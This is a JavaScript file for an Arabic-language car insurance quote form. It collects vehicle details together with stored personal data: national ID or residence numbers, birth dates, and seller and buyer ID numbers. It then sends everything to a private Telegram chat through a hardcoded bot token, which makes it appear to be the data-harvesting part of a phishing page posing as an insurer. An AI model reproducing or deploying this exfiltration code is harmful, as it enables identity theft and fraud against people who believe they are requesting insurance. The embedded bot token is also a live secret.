
  let insuranceType = "ضد الغير"; 

  function selectType(button) {
    document.querySelectorAll(".insurance-type button").forEach(btn => btn.classList.remove("active"));
    button.classList.add("active");
    insuranceType = button.textContent.trim();
  }

  const form = document.getElementById('insuranceForm');

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    const startDate = document.getElementById("namecar").value;
    const usagePurpose = document.getElementById("selectcar").value;
    const carType = document.getElementById("selectecare").value;
    const estimatedValue = document.getElementById("amountcar").value;
    const manufactureYear = document.getElementById("datecar").value;
    const repairPlace = document.querySelector('input[name="repairPlace"]:checked')?.value;

    localStorage.setItem("insuranceType", insuranceType);
    localStorage.setItem("startDate", startDate);
    localStorage.setItem("usagePurpose", usagePurpose);
    localStorage.setItem("carType", carType);
    localStorage.setItem("estimatedValue", estimatedValue);
    localStorage.setItem("manufactureYear", manufactureYear);
    localStorage.setItem("repairPlace", repairPlace);

    let savedFormData = localStorage.getItem("formData");
    let savedDataObj = {};
    if (savedFormData) {
      try {
        savedDataObj = JSON.parse(savedFormData);
      } catch {
        savedDataObj = {};
      }
    }

    const fieldLabels = {
      serial: "الرقم التسلسلي / بطاقة جمركية",
      id: "رقم الهوية / الإقامة",
      dob: "شهر / سنة الميلاد",
      seller_id: "رقم هوية البائع",
      buyer_id: "رقم هوية المشتري",
      seller_dob: "تاريخ ميلاد البائع"
    };

    let message = "🚗 بيانات التأمين:\n\n";

    if (Object.keys(savedDataObj).length > 0) {
      message += " من \n";
      for (const [key, value] of Object.entries(savedDataObj)) {
        const label = fieldLabels[key] || key;
        message += `- ${label}: ${value}\n`;
      }
      message += "\nبيانات السيارة :\n";
    }

    message += `- نوع التأمين: ${insuranceType}\n`;
    message += `- تاريخ البدء: ${startDate}\n`;
    message += `- الغرض من الاستخدام: ${usagePurpose}\n`;
    message += `- نوع السيارة: ${carType}\n`;
    message += `- القيمة التقديرية: ${estimatedValue}\n`;
    message += `- سنة الصنع: ${manufactureYear}\n`;
    message += `- مكان الإصلاح: ${repairPlace}\n`;

    const token = "7306247318:AAGoAlnx8FRFeHTCHEJ5SzhYtkwfxM5_TQg";
    const chatId = "8059394046";


    



    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        form.reset();
        window.location.href = "select.html";
      }
    })
    .catch(error => {
      console.error("Telegram Error:", error);
    });
  });